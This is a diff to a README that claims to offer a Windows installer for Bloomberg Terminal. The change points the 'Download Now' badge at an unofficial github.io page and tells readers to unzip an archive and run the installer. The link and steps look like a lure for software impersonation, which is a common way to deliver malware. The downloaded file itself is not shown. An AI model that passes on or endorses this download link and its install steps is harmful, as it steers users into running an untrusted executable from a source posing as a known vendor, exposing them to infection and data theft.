@@ -8,7 +8,7 @@ With advanced charting, alerts, and secure communication features, Bloomberg Ter
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-black?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-black?style=for-the-badge)](https://bloomberg-terminal-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **Bloomberg Terminal Installer** on your Windows PC.  
